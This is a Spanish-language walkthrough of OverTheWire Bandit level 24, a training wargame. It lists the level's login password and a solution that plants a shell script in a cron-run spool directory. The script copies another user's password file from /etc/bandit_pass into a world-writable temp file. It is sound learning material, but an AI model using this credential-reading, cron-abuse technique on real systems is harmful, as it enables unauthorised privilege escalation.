# Level 24
## Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
## Datos de Acceso al Nivel
```
Server: bandit.labs.overthewire.org
User: bandit24
password : VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

```
## Solucion
```Bash
mkdir /tmp/rrv224
cd /tmp/rrv224
echo "cat /etc/bandit_pass/bandit24 > /tmp/rrv224/password" > script.sh
ls -la
chmod 777 script.sh
touch password
chmod 666 password
ls -la
cp script.sh /var/spool/bandit24/foo
ls -la
cat password
copiar password
exit
```
## Notas Adicionales
|**Comandos**|**Descripcion**|
|--------|-------------|
|stat|El comando **Stat** es utilizado en el sistema Linux o Unix con el objetivo de mostrar información a detalle sobre archivos y sistemas de archivos.|
|for|Es un ciclo utilizado en programacion en distintos lenguajes.|
|timeout|El comando timeout en Linux te permite ejecutar un comando con un límite de tiempo.|
|mkdir|Permite crear un directorio en el directorio actual o en el directorio especificado.|
|cp|Permite copiar un directorio o archivo en el directorio especificado.|
|echo|Permite mostrar un mensaje en pantalla la informacion del bash.|
## Referencias
* https://keepcoding.io/blog/que-es-el-comando-stat-y-como-usarlo-en-linux/
* https://howtoforge.es/explicacion-del-comando-timeout-de-linux-para-principiantes-con-ejemplos/
* https://www.ionos.es/digitalguide/servidores/configuracion/linux-echo/



